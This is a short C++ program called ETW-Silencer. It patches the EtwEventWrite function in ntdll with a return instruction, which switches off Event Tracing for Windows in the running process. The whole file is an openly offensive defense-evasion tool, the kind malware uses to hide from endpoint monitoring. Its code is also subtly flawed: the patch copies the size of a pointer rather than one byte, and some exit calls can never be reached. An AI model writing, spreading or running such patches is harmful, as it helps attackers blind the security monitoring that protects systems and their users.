// ETW-Silencer.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <stdlib.h>

using namespace std;

FARPROC GetNTAPIAddress(char* NTAPIName) {

    HMODULE hmodule;
    FARPROC address;
    
    hmodule = GetModuleHandleW(L"ntdll.dll");
    if (hmodule == NULL) {
        return NULL;
        exit(EXIT_FAILURE);
    }

    address = GetProcAddress(hmodule, NTAPIName);
    if (address == NULL) {
        return NULL;
        exit(EXIT_FAILURE);
    }

    return address;
}   

BOOL ETWSilencer() {
    LPVOID ETWAddress = GetNTAPIAddress((char*)"EtwEventWrite");

    cout << "[+] EtwEventWrite Address: [ " << ETWAddress << " ]" << endl;
    //getchar();

    DWORD oldProtect = 0;
    DWORD oldOldProtect = 0;

    const char* ret = "\xc3";

    if (!VirtualProtect(ETWAddress, sizeof ret, PAGE_READWRITE, &oldProtect)) {
        return FALSE;
        exit(EXIT_FAILURE);
    }

    memcpy(ETWAddress, ret, sizeof ret);

    if (!VirtualProtect(ETWAddress, sizeof ret, oldProtect, &oldOldProtect)) {
        return FALSE;
        exit(EXIT_FAILURE);
    }

    return TRUE;
}

int main()
{
    BOOL success = FALSE;

    if (ETWSilencer() == FALSE) {
        cout << "[-] Can't silence ETW" << endl;
        return EXIT_FAILURE;
    }

    cout << "[+] ETW Silenced" << endl;

    return 0;
}